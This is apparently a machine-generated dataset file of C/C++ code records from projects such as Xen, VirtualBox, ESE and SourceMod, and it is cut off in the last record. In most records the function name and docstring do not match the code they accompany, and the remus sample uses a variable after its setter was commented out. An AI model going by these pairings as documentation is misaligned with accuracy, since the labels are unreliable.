{"content":"{'function_name': 'SetDirection', 'docstring': '\/* Sets the values *HV, *VV to a rand()om direction chosen from preset values *\/', 'code': 'HRESULT InitD3D(HWND hwnd) {\\n\\t\/* Initialises D3D objects, devices and settings *\/\\n\\td3dObject = Direct3DCreate9(D3D_SDK_VERSION);\\n\\n\\tD3DPRESENT_PARAMETERS presParams;\\n\\tZeroMemory(&presParams, sizeof(presParams));\\n\\n\\tpresParams.Windowed\\t\\t\\t\\t\\t= TRUE;\\n\\tpresParams.SwapEffect\\t\\t\\t\\t= D3DSWAPEFFECT_DISCARD;\\n\\tpresParams.BackBufferFormat\\t\\t\\t= D3DFMT_UNKNOWN;\\n\\tpresParams.PresentationInterval\\t\\t= D3DPRESENT_INTERVAL_ONE;\\n\\n\\treturn\\n\\t  d3dObject ->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hwnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &presParams, &d3dDevice);\\n}'}","id":4536}
{"content":"{'function_name': 'main_networklist', 'docstring': '\/*      Idx  BE   MAC   Hdl  Sta  evch txr\/rxr  BE-path *\/', 'code': 'int main_remus(int argc, char **argv)\\n{\\n    int opt, rc, daemonize = 1;\\n    const char *ssh_command = \"ssh\";\\n    char *host = NULL, *rune = NULL, *domain = NULL;\\n    libxl_domain_remus_info r_info;\\n    int send_fd = -1, recv_fd = -1;\\n    pid_t child = -1;\\n    uint8_t *config_data;\\n    int config_len;\\n\\n    memset(&r_info, 0, sizeof(libxl_domain_remus_info));\\n    \/* Defaults *\/\\n    r_info.interval = 200;\\n    r_info.blackhole = 0;\\n    r_info.compression = 1;\\n\\n    while ((opt = def_getopt(argc, argv, \"bui:s:e\", \"remus\", 2)) != -1) {\\n        switch (opt) {\\n        case 0: case 2:\\n            return opt;\\n\\n        case \\'i\\':\\n\\t    r_info.interval = atoi(optarg);\\n            break;\\n        case \\'b\\':\\n            r_info.blackhole = 1;\\n            break;\\n        case \\'u\\':\\n\\t    r_info.compression = 0;\\n            break;\\n        case \\'s\\':\\n            ssh_command = optarg;\\n            break;\\n        case \\'e\\':\\n            daemonize = 0;\\n            break;\\n        }\\n    }\\n\\n    domain = argv[optind];\\n    host = argv[optind + 1];\\n\\n    if (r_info.blackhole) {\\n        find_domain(domain);\\n        send_fd = open(\"\/dev\/null\", O_RDWR, 0644);\\n        if (send_fd < 0) {\\n            perror(\"failed to open \/dev\/null\");\\n            exit(-1);\\n        }\\n    } else {\\n\\n        if (!ssh_command[0]) {\\n            rune = host;\\n        } else {\\n            if (asprintf(&rune, \"exec %s %s xl migrate-receive -r %s\",\\n                         ssh_command, host,\\n                         daemonize ? \"\" : \" -e\") < 0)\\n                return 1;\\n        }\\n\\n\/\/ \u6ca1\u6709\u4f7f\u7528\u4e0a\uff0c\u4e34\u65f6\u6ce8\u91ca\\n\/\/        save_domain_core_begin(domain, NULL, &config_data, &config_len);\\n\\n        if (!config_len) {\\n            fprintf(stderr, \"No config file stored for running domain and \"\\n                    \"none supplied - cannot start remus.\\\\n\");\\n            exit(1);\\n        }\\n\\n        child = create_migration_child(rune, &send_fd, &recv_fd);\\n\\n        migrate_do_preamble(send_fd, recv_fd, child, config_data, config_len,\\n                            rune);\\n    }\\n\\n    \/* Point of no return *\/\\n    rc = libxl_domain_remus_start(ctx, &r_info, domid, send_fd, recv_fd, 0);\\n\\n    \/* If we are here, it means backup has failed\/domain suspend failed.\\n     * Try to resume the domain and exit gracefully.\\n     * TODO: Split-Brain check.\\n     *\/\\n    fprintf(stderr, \"remus sender: libxl_domain_suspend failed\"\\n            \" (rc=%d)\\\\n\", rc);\\n\\n    if (rc == ERROR_GUEST_TIMEDOUT)\\n        fprintf(stderr, \"Failed to suspend domain at primary.\\\\n\");\\n    else {\\n        fprintf(stderr, \"Remus: Backup failed? resuming domain at primary.\\\\n\");\\n        libxl_domain_resume(ctx, domid, 1, 0);\\n    }\\n\\n    close(send_fd);\\n    return -ERROR_FAIL;\\n}'}","id":4537}
{"content":"{'function_name': 'cpumR0MapLocalApicCpuProber', 'docstring': '\/*\\n     * Check for APIC support.\\n     *\/', 'code': 'static DECLCALLBACK(void) cpumR0MapLocalApicCpuChecker(RTCPUID idCpu, void *pvUser1, void *pvUser2)\\n{\\n    NOREF(pvUser1); NOREF(pvUser2);\\n\\n    int iCpu = RTMpCpuIdToSetIndex(idCpu);\\n    AssertReturnVoid(iCpu >= 0 && (unsigned)iCpu < RT_ELEMENTS(g_aLApics));\\n    if (!g_aLApics[iCpu].fEnabled)\\n        return;\\n\\n    \/*\\n     * 0x0X       82489 external APIC\\n     * 0x1X       Local APIC\\n     * 0x2X..0xFF reserved\\n     *\/\\n    uint32_t uApicVersion;\\n    if (g_aLApics[iCpu].fX2Apic)\\n        uApicVersion = ApicX2RegRead32(APIC_REG_VERSION);\\n    else\\n        uApicVersion = ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_VERSION);\\n    if ((APIC_REG_VERSION_GET_VER(uApicVersion) & 0xF0) == 0x10)\\n    {\\n        g_aLApics[iCpu].uVersion    = uApicVersion;\\n\\n#if 0 \/* enable if you need it. *\/\\n        if (g_aLApics[iCpu].fX2Apic)\\n            SUPR0Printf(\"CPUM: X2APIC %02u - ver %#010x, lint0=%#07x lint1=%#07x pc=%#07x thmr=%#07x cmci=%#07x\\\\n\",\\n                        iCpu, uApicVersion,\\n                        ApicX2RegRead32(APIC_REG_LVT_LINT0), ApicX2RegRead32(APIC_REG_LVT_LINT1),\\n                        ApicX2RegRead32(APIC_REG_LVT_PC), ApicX2RegRead32(APIC_REG_LVT_THMR),\\n                        ApicX2RegRead32(APIC_REG_LVT_CMCI));\\n        else\\n        {\\n            SUPR0Printf(\"CPUM: APIC %02u at %RGp (mapped at %p) - ver %#010x, lint0=%#07x lint1=%#07x pc=%#07x thmr=%#07x cmci=%#07x\\\\n\",\\n                        iCpu, g_aLApics[iCpu].PhysBase, g_aLApics[iCpu].pv, uApicVersion,\\n                        ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_LVT_LINT0), ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_LVT_LINT1),\\n                        ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_LVT_PC), ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_LVT_THMR),\\n                        ApicRegRead(g_aLApics[iCpu].pv, APIC_REG_LVT_CMCI));\\n            if (uApicVersion & 0x80000000)\\n            {\\n                uint32_t uExtFeatures = ApicRegRead(g_aLApics[iCpu].pv, 0x400);\\n                uint32_t cEiLvt = (uExtFeatures >> 16) & 0xff;\\n                SUPR0Printf(\"CPUM: APIC %02u: ExtSpace available. extfeat=%08x eilvt[0..3]=%08x %08x %08x %08x\\\\n\",\\n                            iCpu,\\n                            ApicRegRead(g_aLApics[iCpu].pv, 0x400),\\n                            cEiLvt >= 1 ? ApicRegRead(g_aLApics[iCpu].pv, 0x500) : 0,\\n                            cEiLvt >= 2 ? ApicRegRead(g_aLApics[iCpu].pv, 0x510) : 0,\\n                            cEiLvt >= 3 ? ApicRegRead(g_aLApics[iCpu].pv, 0x520) : 0,\\n                            cEiLvt >= 4 ? ApicRegRead(g_aLApics[iCpu].pv, 0x530) : 0);\\n            }\\n        }\\n#endif\\n    }\\n    else\\n    {\\n        g_aLApics[iCpu].fEnabled = false;\\n        g_aLApics[iCpu].fX2Apic  = false;\\n        SUPR0Printf(\"VBox\/CPUM: Unsupported APIC version %#x (iCpu=%d)\\\\n\", uApicVersion, iCpu);\\n    }\\n}'}","id":4539}
{"content":"{'function_name': 'inicijalizacija_mrava', 'docstring': '\/\/u trenutnu aktivnost mrava inicijalno stavljam po\u010detnu vrijednost', 'code': 'vector<int> eksploatacija(int k, int N){\\n\\n\\tdouble temp=0.0;\\n\\tvector<int> sljedeca_aktivnostp;\\n\\tfor(int i=0;i<2;i++)\\n\\t\\tsljedeca_aktivnostp.push_back(0);\\n\\t\/\/trenutni posao mrava\\n\\tint lk=trenutna_aktivnost_mrava[k][0];\\n\\t\/\/trenutni stroj\\n\\tint mch=trenutna_aktivnost_mrava[k][1];\\n\\tfor(int i=0;i<vektor_poslova[N];i++){\\n\\t\\tfor(int j=0;j<vektor_strojeva[N];j++){\\n\\t\\t\/\/if(tabu_lista[k][i]==1 && lk!=i && heuristicke_vrijednosti[lk][i]!=Beskonacnost && temp < pow(jacina_feromonskog_traga[lk][i],alfa)*pow(tablica_heuristickih_vrijednosti[lk][i],beta))\\n\\t\\t\\t\/\/ako mrav nije posjetio taj posao i ako se ponovno ne vra\u0107a u isti posao tada ...\\n\\t\\t\\tif(tabu_lista[k][i]==1 && lk!=i && temp < pow(jacina_feromonskog_traga[lk][i][j],alfa)*pow(tablica_heuristickih_vrijednosti[lk][i][j],beta))\\n\\t\\t\\t{\\n\\t\\t\\t\\ttemp=pow(jacina_feromonskog_traga[lk][i][j],alfa)*pow(tablica_heuristickih_vrijednosti[lk][i][j],beta);\\n\\t\\t\\t\\tsljedeca_aktivnostp[0]=i;\\n\\t\\t\\t\\tsljedeca_aktivnostp[1]=j;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\treturn sljedeca_aktivnostp;\\n}'}","id":4544}
{"content":"{'function_name': 'UnhookFunction', 'docstring': '\/\/ Only disable the detour if there are no more listeners.\\r', 'code': 'bool AddDetourPluginHook(HookType_t hookType, CHook *pDetour, HookSetup *setup, IPluginFunction *pCallback)\\r\\n{\\r\\n\\tDetourMap *map;\\r\\n\\tif (hookType == HOOKTYPE_PRE)\\r\\n\\t\\tmap = &g_pPreDetours;\\r\\n\\telse\\r\\n\\t\\tmap = &g_pPostDetours;\\r\\n\\r\\n\\t\/\/ See if we already have this detour in our list.\\r\\n\\tPluginCallbackList *wrappers;\\r\\n\\tDetourMap::Insert f = map->findForAdd(pDetour);\\r\\n\\tif (f.found())\\r\\n\\t{\\r\\n\\t\\twrappers = f->value;\\r\\n\\t}\\r\\n\\telse\\r\\n\\t{\\r\\n\\t\\t\/\/ Create a vector to store all the plugin callbacks in.\\r\\n\\t\\twrappers = new PluginCallbackList;\\r\\n\\t\\tif (!map->add(f, pDetour, wrappers))\\r\\n\\t\\t{\\r\\n\\t\\t\\tdelete wrappers;\\r\\n\\t\\t\\tUnhookFunction(hookType, pDetour);\\r\\n\\t\\t\\treturn false;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ Add the plugin callback to the detour list.\\r\\n\\tCDynamicHooksSourcePawn *pWrapper = new CDynamicHooksSourcePawn(setup, pDetour, pCallback, hookType == HOOKTYPE_POST);\\r\\n\\twrappers->push_back(pWrapper);\\r\\n\\r\\n\\treturn true;\\r\\n}'}","id":4545}
{"content":"{'function_name': 'isPrime', 'docstring': '\/\/ middle five numbers in below loop  ', 'code': 'int nextPrime(ll int N) \\n{ \\n  \\n    \/\/ Base case \\n    if (N <= 1) \\n        return 2; \\n  \\n    ll int prime = N; \\n    bool found = false; \\n  \\n    \/\/ Loop continuously until isPrime returns \\n    \/\/ true for a number greater than n \\n    while (!found) { \\n        prime++; \\n  \\n        if (isPrime(prime)) \\n            found = true; \\n    } \\n  \\n    return prime; \\n}'}","id":4551}
{"content":"{'function_name': 'drawVertices', 'docstring': '\/\/ use the same color for all points', 'code': 'GLsizei bindEdges(GLuint VAO, GLuint VBO, const Obj& obj)\\n{\\n    \/\/ bind VAO\\n    glBindVertexArray(VAO);\\n\\n    \/\/ bind VBO, buffer data to it\\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\\n\\n    \/\/ each face has 3 edges, though we are drawing one edge twice...\\n    std::vector<Vertex> data;\\n    for (const auto& face : obj.faces) {\\n        int vid[3] = {face[0] - 1, face[1] - 1, face[2] - 1};\\n        \/\/ edge (0, 1)\\n        data.push_back(obj.vertices[vid[0]]);\\n        data.push_back(obj.vertices[vid[1]]);\\n        \/\/ edge (0, 2)\\n        data.push_back(obj.vertices[vid[0]]);\\n        data.push_back(obj.vertices[vid[2]]);\\n        \/\/ edge (1, 2)\\n        data.push_back(obj.vertices[vid[1]]);\\n        data.push_back(obj.vertices[vid[2]]);\\n    }\\n\\n    glBufferData(GL_ARRAY_BUFFER, sizeof(Vertex) * data.size(), &data.front(), GL_STATIC_DRAW);\\n\\n    \/\/ set vertex attribute pointers\\n    \/\/ position attribute\\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (GLvoid*)0);\\n    glEnableVertexAttribArray(0);\\n\\n    \/\/ unbind VBO & VAO\\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\\n    glBindVertexArray(0);\\n\\n    return GLsizei(data.size());\\n}'}","id":4555}
{"content":"{'function_name': 'ErrDBLGVersionUpdate', 'docstring': '\/\/', 'code': 'ERR ErrDBUpdateAndFlushVersion(\\n    _In_    const INST* const       pinst,\\n    _In_z_  const WCHAR * const     wszDbFullName,\\n    _In_    PIB * const             ppib,\\n    _In_    const IFMP              ifmp,\\n    _In_    const BOOL              fCreateDbUpgradeDoNotLog )  \/\/ true to suppress logging on create DB path\\n{\\n    ERR err = JET_errSuccess;\\n    FMP * const pfmp = &g_rgfmp[ifmp];\\n    \\n    Assert( ifmp != ifmpNil && ifmp != 0 ); \/\/ ?? FValidIfmp()?\\n    Assert( !pinst->FRecovering() );\\n    Assert( pinst->m_plog->FRecoveringMode() != fRecoveringUndo );\\n\\n    DbVersion dbvBefore;\\n    BOOL fDbNeedsUpdate = fFalse;\\n    const FormatVersions * pfmtversDesired = NULL;\\n\\n    {\\n    PdbfilehdrReadOnly pdbfilehdr = pfmp->Pdbfilehdr();\\n\\n    dbvBefore = pdbfilehdr->Dbv();\\n\\n    \/\/  Check if the header is compatible and\/or needs updating.\\n\\n    Call( ErrDBIValidateUserVersions( pinst, wszDbFullName, ifmp, pdbfilehdr.get(), &pfmtversDesired, &fDbNeedsUpdate ) );\\n    } \/\/ .dtor release dbfilehdr lock\\n\\n    \/\/  Do not even log (and of course update DB, but that\\'s double protected lower) if the desired\\n    \/\/  version is below the current pdbfilehdr version.  We do allow logging of equal DbVersions in \\n    \/\/  case a log replaying replica missed such an update due to Incremental Reseed or lossy failover.\\n\\n    if ( CmpDbVer( dbvBefore, pfmtversDesired->dbv ) > 0 )\\n    {\\n        Assert( !fDbNeedsUpdate );\\n\\n        OSTrace( JET_tracetagUpgrade, OSFormat( \"Suppress DB Version Downgrade LR: %d.%d.%d to %d.%d.%d - %ws\\\\n\",\\n                    dbvBefore.ulDbMajorVersion, dbvBefore.ulDbUpdateMajor, dbvBefore.ulDbUpdateMinor, \/\/ current dbfilehdr\\n                    pfmtversDesired->dbv.ulDbMajorVersion, pfmtversDesired->dbv.ulDbUpdateMajor, pfmtversDesired->dbv.ulDbUpdateMinor,\\n                    wszDbFullName ) );\\n        return JET_errSuccess;\\n    }\\n    Assert( fDbNeedsUpdate || CmpDbVer( dbvBefore, pfmtversDesired->dbv ) == 0 );\\n\\n    if ( g_rgfmp[ ifmp ].FLogOn() )\\n    {\\n\\n        \/\/  Note: takes care of both rolling log to upgrade\/downgrade the log version as well as logging the header\\n        \/\/  versions update (so must be called whether fDbNeedsUpdate is true or not).  Also we always log the\\n        \/\/  SetDbVer on every attach to workaround inc reseed issues documented in this function.\\n        Call( ErrDBLGVersionUpdate( pinst, ppib, ifmp, pfmtversDesired, fDbNeedsUpdate ) );\\n    }\\n\\n    {\\n    PdbfilehdrReadWrite pdbfilehdr = pfmp->PdbfilehdrUpdateable();\\n    \\n    \/\/  Post logging dbv should not have been updated by any other method ...\\n\\n    OnDebug( if ( ( rand() % 5 ) == 0 ) UtilSleep( 20 ) );\\n\\n    AssertTrack( CmpDbVer( dbvBefore, pdbfilehdr->Dbv() ) == 0, \"UnexpectedDbVersionChange\" );  \/\/ upgrade to Enforce at some point\\n\\n    if ( fDbNeedsUpdate )\\n    {\\n        \/\/  Update the headers DB version to the desired one.\\n\\n        DBISetVersion( pinst, wszDbFullName, ifmp, pfmtversDesired->dbv, pdbfilehdr.get(), fDbNeedsUpdate, fCreateDbUpgradeDoNotLog );\\n    }\\n\\n    } \/\/ .dtor release dbfilehdr lock\\n\\n    Assert( CmpDbVer( pfmp->Pdbfilehdr()->Dbv(), pfmtversDesired->dbv ) >= 0 );\\n\\n    if ( fDbNeedsUpdate )\\n    {\\n        Assert( pfmp->Pfapi() );\\n        err = ErrUtilWriteAttachedDatabaseHeaders( pinst, pinst->m_pfsapi, pfmp->WszDatabaseName(), pfmp, pfmp->Pfapi() );\\n    }\\n\\n    \/\/  Today, this shouldn\\'t go off, because there is only one consumer of the header update \\n    \/\/  state. But if someone utilizes it from like checkpoint update or something, this will\\n    \/\/  start going off and someone really should allow (and probably increase the header lock\\n    \/\/  rank) the header lock be held over logging data, and definitely let the lock be passed\\n    \/\/  into ErrUtilWriteAttachedDatabaseHeaders().\\n    Assert( !pfmp->FHeaderUpdateInProgress() || err < JET_errSuccess );\\n\\n    \/\/  We have somehow downgraded the DB version!  Bad.\\n    AssertTrack( CmpDbVer( pfmp->Pdbfilehdr()->Dbv(), dbvBefore ) >= 0, \"InvalidDbVersionDowngradeUpdate\" );\\n\\nHandleError:\\n    return err;\\n}'}","id":4571}
{"content":"{'function_name': 'demosaicb_rd14_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd15_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd15 read pattern: { demosaicb_update_0[d0, d1] -> denoise[2 + 2d0, -1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1926 : 0 <= d0 <= 959 and 0 <= d1 <= 1081; demosaicb_update_0[d0, d1] -> (966 + d0) : d0 = 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write0 = denoise.denoise_denoise_update_0_write0_merged_banks_9.peek_1926();\\n  return value_denoise_denoise_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4572}
{"content":"{'function_name': 'cast_IEEE754', 'docstring': '\/\/ std::cout << std::hex << \"result = \" << result.to_string(16) << std::dec << \"\\\\n\";', 'code': 'static\\nlong int lrint(double x) {\\n    \/\/ Note: long int may be 32 or 64 bits.\\n    return cast_IEEE754<long int>(x);\\n}'}","id":4573}
{"content":"{'function_name': 'demosaic_bx_demosaic_byb_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_byb_rd5', 'code': 'inline hw_uint<16> demosaic_bx_rd0_select(demosaic_bxb_cache& demosaic_bxb, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_bx_rd0 read pattern: { demosaic_bx_update_0[d0, d1] -> demosaic_bxb[2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaic_bx_update_0[d0, d1] -> [3 + d1, 3 + d0, 7] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { demosaic_bxb_update_0[d0, d1] -> [3 + d1, 3 + d0, 6] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_bxb_demosaic_bxb_update_0_write0 = demosaic_bxb.demosaic_bxb_demosaic_bxb_update_0_write0_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_bxb_demosaic_bxb_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4580}
{"content":"{'function_name': 'coe2mee', 'docstring': '\/\/k', 'code': 'void ee2coe(int& flag, double* coe, const double* ee, double mu)\\n{\\n\\tflag=0;\\n\\tif(mu<=0.0||ee[0]<=0.0)\\n\\t\\treturn;\\n\\n\\tdouble p=ee[0], f=ee[1], g=ee[2], h=ee[3], k=ee[4], L=ee[5];\\n\\tcoe[1]=sqrt(f*f+g*g);\\n\\tif(coe[1]==1.0)\\n\\t\\tcoe[0]=0.5*p;\/\/\u629b\u7269\u7ebf\u8f68\u9053\u7684\u8fd1\u661f\u8ddd\\n\\telse\\n\\t\\tcoe[0]=p\/(fabs(1.0-coe[1]*coe[1]));\/\/\u534a\u957f\u8f74\\n\\tdouble temp=sqrt(h*h+k*k);\\n\\tcoe[2]=2.0*atan(temp);\\n\\tif(temp<=0.0)\\n\\t{\\n\\t\\tcoe[3]=0.0;\/\/\u5347\u4ea4\u70b9\u8d64\u7ecf\\n\/\/\\t\\tcout<<\"\u8f68\u9053\u503e\u89d2\u63a5\u8fd10\u6216180\u5ea6,\u5347\u4ea4\u70b9\u8d64\u7ecf\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;\\n\\t\\tif(coe[1]<=0.0)\\n\\t\\t{\\n\\t\\t\\tcoe[4]=0.0;\/\/\u8fd1\u661f\u70b9\u5e45\u89d2\\n\/\/\\t\\t\\tcout<<\"\u504f\u5fc3\u7387\u63a5\u8fd10,\u8fd1\u661f\u70b9\u5e45\u89d2\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;        \\n\\t\\t\\tcoe[5]=L;\/\/\u771f\u8fd1\u70b9\u89d2\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tcoe[4]=atan2(g,f); \/\/\u8fd1\u661f\u70b9\u5e45\u89d2       \\n\\t\\t\\tcoe[5]=L-coe[4];\\n\\t\\t}\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tcoe[3]=atan2(k,h);\\n\\t\\tcoe[5]=L-coe[3];\\n\\t\\tif(coe[1]<=0.0)\\n\\t\\t{\\n\\t\\t\\tcoe[4]=0.0;\\n\/\/\\t\\t\\tcout<<\"\u504f\u5fc3\u7387\u63a5\u8fd10,\u8fd1\u661f\u70b9\u5e45\u89d2\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tcoe[4]=atan2(g*h-f*k,f*h+g*k);\\n\\t\\t\\tcoe[5]=coe[5]-coe[4];\\n\\t\\t}\\n\\t}\\n\\t\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d\\n\\tcoe[3]=fmod(coe[3], D2PI);\\n\\tif(coe[3]<0.0)\\n\\t\\tcoe[3]+=D2PI;\\n\\tcoe[4]=fmod(coe[4], D2PI);\\n\\tif(coe[4]<0.0)\\n\\t\\tcoe[4]+=D2PI;\\n\\tcoe[5]=fmod(coe[5], D2PI);\\n\\tif(coe[5]<0.0)\\n\\t\\tcoe[5]+=D2PI;\\n\\tif(coe[1]>=1.0)\\n\\t{\\n\\t\\tif(coe[5]>DPI-acos(1.0\/coe[1]))\\n\\t\\t\\tcoe[5]-=D2PI;\\n\\t\\telse if(coe[5]<-DPI+acos(1.0\/coe[1]))\\n\\t\\t\\tcoe[5]+=D2PI;\\n\\t}\\n\\tflag=1;\\n\\treturn;\\n}'}","id":4582}
{"content":"{'function_name': 'list_del', 'docstring': '\/* element pointing to data, fixed mem-leak 0.41 *\/', 'code': 'int list_higher_level( List *l ) {\\n  Element **newcur;\\n  \\n  if ( !l ) return(1);\\n\\n  \/*\\n     Security-check: NULL pointer passed to realloc.\\n      ANSI allows this, but it may cause portability problems.\\n  *\/    \\n  newcur = (Element **)realloc(l->current, (l->level+2)*sizeof(Element *));\\n  if (newcur) {\\n    l->current = newcur;\\n    l->level++;\\n    l->current[l->level] = l->start.next;\\n  }\\n  g_debug(fprintf(stderr, \"LEV5: level++=%d current[]=%p\\\\n\",\\n     l->level, l->current);)\\n  if ( !newcur  ) {\\n    fprintf(stderr, \" realloc failed! abort\\\\n\"); return(1);\\n  }\\n  return 0;\\n}'}","id":4589}
{"content":"{'function_name': 'cal_prefix_fun', 'docstring': '\/\/   cout<<ch<<endl;', 'code': 'int substring_match(string ST,string sub_st,int start)\\n{\\n\/\/    if(sub_st==\"\") return start;\\n    vector<int> v;\\n    v=cal_prefix_fun(sub_st);\\n    int k=-1,len=ST.length(),m=sub_st.length();\\n    for(int i=start;i<len;i++)\\n    {\\n        while(k>=0 && ST[i]!=sub_st[k+1]){\\n\\n             k=v[k];\\n        }\\n        if(sub_st[k+1]==ST[i]) k++;\\n        if(k==m-1)\\n        {\\n            return i+1;\\n        }\\n    }\\n\/\/    cout<<\"return korlam\"<<endl;\\n    return len+1;\\n}'}","id":4591}
{"content":"{'function_name': 'Free', 'docstring': '\/\/  static          libgwr::StackGS < NSP *  >  *       gd_stack_nsp            = GWR_NEW_CAST( libgwr::StackGS < NSP * > );', 'code': 'gboolean            Reset()\\n{\\n    \/\/  reset lexer & parser\\n    lexer::Reset();\\n    parser::Reset();\\n\\n    \/\/  reset the stream\\n    ga_stream               =   NULL;\\n\\n    \/\/  reset all dynamic vars\\n    gd_namespaces_prefixes  =   GWR_NEW_CAST( tStringArray, 150, 2 );\\n    gd_channels_prefix      =   NULL;\\n    gd_file_h               =   NULL;\\n    gd_file_cc              =   NULL;\\n\\n    ga_thm_card             =   0;\\n    ga_fla_card             =   0;\\n\\n    return TRUE;\\n}'}","id":4593}
{"content":"{'function_name': 'sum', 'docstring': '\/\/end for loop', 'code': 'double calcAverage(const int numbers[], int count) {\\n    \/*\\n     * description: calculates the average of numbers\\n     * input: numbers(array), count(int)\\n     * output: average(double)\\n     * preconditions: none\\n     * postconditions: average of all numbers returned\\n     *\/\\n    double average;\/\/average of numbers\\n    \\n    average = sum(numbers, count) \/ static_cast<double>(count);\\n    return average;\\n}'}","id":4595}
{"content":"{'function_name': 'gettimeofday', 'docstring': \"\/\/ Note: some broken versions only have 8 trailing zero's, the correct epoch has 9 trailing zero's\", 'code': 'unsigned int sleep(unsigned int seconds)\\n    {\\n        Sleep(seconds * 1000); \/\/ takes milliseconds\\n        return 0;\\n    }'}","id":4606}
{"content":"{'function_name': 'unselect_piece', 'docstring': '\/\/ If we have no pieces left we can move then end turn.', 'code': 'void try_to_move_piece(int x, int y, bool real)\\n{\\n\\tint total;\\n\\tchar name[80];\\n\\n\\t\/\/sprintf(name, \"x: %d, y: %d, selected_x: %d, selected_y: %d\", x, y, board_info.selected_x, board_info.selected_y);\\n\\n\\t\/\/ Reset highlight in case we can\\'t move.\\n\\tboard_info.highlight_alpha.target = 0.0;\\n\\t\/\/add_chat_line(name, wizard[game.current_wizard].col);\\n\\n\\tif (x == board_info.selected_x && y == board_info.selected_y)\\n\\t{\\n\\t\\t\/\/ Let computer player cancel movement by trying to move onto existing position.\\n\\t\\t\/\/ Human players can\\'t do this!\\n\\t\\tif (real && !wizard[game.current_wizard].human)\\n\\t\\t{\\n\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_moved = true;\\n\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked = true;\\n\\t\\t\\tboard_info.selected_engaged = false;\\n\\t\\t}\\n\\t\\treturn; \/\/ Can\\'t move piece over itself!\\n\\t}\\n\\n\\tif (highlight_board[x][y].type == HIGHLIGHT_NONE)\\n\\t{\\n\\t\\tclear_land_movement_route(); \/\/ Clear any old arrows to avoid misleading info being shown to player.\\n\\t\\treturn; \/\/ Can\\'t move here!\\n\\t}\\n\\n\\t\/\/ Set cursor highlight..  \\n\\tboard_info.highlight_type = highlight_board[x][y].type;\\n\\tboard_info.highlight_alpha.target = 1.0;\\n\\tboard_info.highlight_x = x;\\n\\tboard_info.highlight_y = y;\\n\\n\\t\/\/ Land based movement?\\n\\tif (board_info.selected_state && !board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].flying &&\\n\\t\\t!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_moved)\\n\\t{\\n\\t\\tdraw_land_movement_route(x, y);\\n\\t}\\n\\n\\tif (!real) return; \/\/ Done highlighting, so if not really moving then return.\\n\\n\\thide_highlight_board(false);\\n\\n\\t\/\/ Ok, move.\\n\\tif (!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].flying &&\\n\\t\\t!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_moved)\\n\\t{\\n\\t\\tmove_piece_along_route(x, y);\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tmove_piece(x, y);\\n\\t}\\n\\n\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_moved = true;\\n\\n\\t\/\/ Check if we have become engaged to an enemy piece. If we have not just mounted.\\n\\tif (board_info.selected_layer == PIECE &&\\n\\t\\t!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked)\\n\\t{\\n\\t\\tboard_info.selected_engaged = engaged_around_piece(board_info.selected_x, board_info.selected_y);\\n\\t}\\n\\n\\t\/\/ If we are engaged, then now show possible attacks.\\n\\tif 